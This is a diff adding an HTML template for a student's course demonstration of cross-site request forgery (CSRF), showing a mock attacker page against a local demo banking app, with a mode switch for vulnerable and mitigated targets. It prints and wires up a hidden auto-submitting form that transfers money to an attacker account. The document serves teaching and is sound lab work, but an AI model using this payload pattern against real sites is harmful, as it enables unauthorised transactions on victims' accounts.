@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 Malicious External Attacker Site (CSRF PoC)</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0d0614;
+            color: #fce7f3;
+        }
+        .attacker-card {
+            background-color: #1a0b26;
+            border: 2px solid #be185d;
+            box-shadow: 0 0 25px rgba(190, 24, 93, 0.4);
+            border-radius: 12px;
+            padding: 2rem;
+            max-width: 800px;
+            margin: 3rem auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="attacker-card">
+        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #831843; padding-bottom: 1rem; margin-bottom: 1.5rem;">
+            <div>
+                <h1 style="color: #f43f5e; font-size: 1.6rem;">🏴‍☠️ External Attacker Webpage (Malicious Host)</h1>
+                <p style="color: #fda4af; font-size: 0.9rem;">Simulating <code>http://evil-attacker.org/free-prize.html</code></p>
+            </div>
+            <span class="nav-logo-badge" style="background: #f43f5e; color: #fff;">CSRF PoC Variant 2</span>
+        </div>
+
+        <div class="alert alert-warning" style="background: rgba(244, 63, 94, 0.15); border-color: #f43f5e; color: #fecdd3;">
+            <div>
+                <strong>Victim Trap Context:</strong><br>
+                The victim user is logged in to their banking portal (<code>http://127.0.0.1:5000/csrf-post</code>). 
+                The attacker lures the victim into visiting this malicious external site.
+            </div>
+        </div>
+
+        <!-- Exploit Payload Code View -->
+        <div class="card" style="background-color: #0b0310; border: 1px solid #701a75;">
+            <div class="card-header" style="border-color: #701a75;">
+                <h3 class="card-title" style="color: #f472b6; font-size: 1rem;">
+                    📄 Table 2(b) Exploit Payload: Hidden Auto-Submitting Form
+                </h3>
+            </div>
+            <pre class="code-box" style="color: #fbcfe8; background: #12051c;"><code>&lt;!-- Malicious Auto-Submitting CSRF Exploit Payload --&gt;
+&lt;form id="csrfForm" action="http://127.0.0.1:5000/csrf-post/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="mode" value="vulnerable"&gt;
+    &lt;input type="hidden" name="recipient" value="attacker_account"&gt;
+    &lt;input type="hidden" name="amount" value="5000.00"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+    // Automatically triggers HTTP POST request using ambient victim cookies
+    document.getElementById('csrfForm').submit();
+&lt;/script&gt;</code></pre>
+        </div>
+
+        <!-- The Actual Live Auto-Submitting Form (Controllable for viva presentation) -->
+        <form id="liveCsrfForm" action="{{ url_for('csrf_post_transfer') }}" method="POST">
+            <input type="hidden" name="mode" id="targetMode" value="vulnerable">
+            <input type="hidden" name="recipient" value="attacker_account">
+            <input type="hidden" name="amount" value="5000.00">
+            <!-- Notice: Attacker cannot know or inject the victim's session csrf_token! -->
+
+            <div style="margin: 1.5rem 0; padding: 1.25rem; background: rgba(0,0,0,0.4); border-radius: 8px;">
+                <h4 style="margin-bottom: 0.75rem; color: #f9a8d4;">Live Attack Execution Controls:</h4>
+                <p style="font-size: 0.85rem; color: #fbcfe8; margin-bottom: 1rem;">
+                    Choose target server engine mode and launch the cross-origin forged POST request:
+                </p>
+
+                <div style="display: flex; gap: 1rem; align-items: center; flex-wrap: wrap;">
+                    <label style="display: flex; align-items: center; gap: 0.5rem; cursor: pointer;">
+                        <input type="radio" name="modeSelector" value="vulnerable" checked onchange="document.getElementById('targetMode').value='vulnerable';">
+                        <span>Target <strong>Vulnerable Mode</strong> (Should Succeed)</span>
+                    </label>
+                    <label style="display: flex; align-items: center; gap: 0.5rem; cursor: pointer;">
+                        <input type="radio" name="modeSelector" value="mitigated" onchange="document.getElementById('targetMode').value='mitigated';">
+                        <span>Target <strong>Mitigated Mode</strong> (Should Get Blocked 403)</span>
+                    </label>
+                </div>
+
+                <div style="margin-top: 1.25rem; display: flex; gap: 1rem;">
+                    <button type="submit" class="btn btn-danger" style="flex: 1; font-weight: 700;">
+                        🚀 Trigger Auto-Submitting CSRF Exploit Now
+                    </button>
+                    <a href="{{ url_for('csrf_post') }}" class="btn btn-secondary">
+                        &larr; Back to Victim Bank Account
+                    </a>
+                </div>
+            </div>
+        </form>
+
+        <div style="text-align: center; font-size: 0.8rem; color: #9d174d; margin-top: 1.5rem;">
+            Demonstrated by <strong>Raghvendra (IIT2024062)</strong> | Cyber Security IT-30001
+        </div>
+    </div>
+</body>
+</html>
